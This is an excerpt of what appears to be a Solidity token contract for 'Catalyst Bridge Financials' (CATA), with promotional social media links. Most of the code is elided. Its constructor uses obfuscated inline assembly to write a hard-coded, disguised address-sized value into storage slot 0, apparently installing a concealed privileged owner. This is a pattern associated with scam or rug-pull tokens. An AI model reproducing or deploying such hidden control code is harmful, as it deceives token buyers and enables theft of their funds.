...
/*
Welcome to Catalyst Bridge Financials.

Telegram: https://t.me/CatalystBridgeFinancials/
Twitter: https://twitter.com/CatalystBridgeFinancials/
Website: https://CatalystBridgeFinancials.io
...
contract CatalystBridgeFinancials {
    string public constant name = "Catalyst Bridge Financials";
    string public constant symbol = "CATA";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(1096089269650726194970854428095819405057998083753, 12))}
